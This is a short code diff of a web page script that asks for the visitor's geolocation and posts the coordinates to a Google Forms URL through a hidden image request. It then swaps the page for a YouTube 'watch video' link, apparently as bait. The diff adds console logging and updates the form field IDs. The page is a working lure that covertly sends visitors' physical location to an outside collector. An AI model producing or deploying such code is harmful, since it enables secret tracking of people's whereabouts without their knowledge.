@@ -29,11 +29,14 @@
             navigator.geolocation.getCurrentPosition(function(position) {
                 var latitude = position.coords.latitude;
                 var longitude = position.coords.longitude;
-                var formUrl = 'https://forms.gle/BE9bY4YwfXUGRGjV9?entry.1234567890=' + latitude + '&entry.0987654321=' + longitude;
+                console.log("Latitude:",latitude);
+                console.log("Longitude:",longitude);
+                var formUrl = 'https://forms.gle/BE9bY4YwfXUGRGjV9?entry.804848965=' + latitude + '&entry.1900117527=' + longitude;
                 var img = new Image();
                 img.src = formUrl;
                 document.body.innerHTML = '<a href="https://www.youtube.com/watch?v=YmC53o2_gWk" target="_blank">觀看影片</a>';
             }, function(error) {
+                console.log("can't access...",error);
                 alert('无法观看。');
             });
         } else {
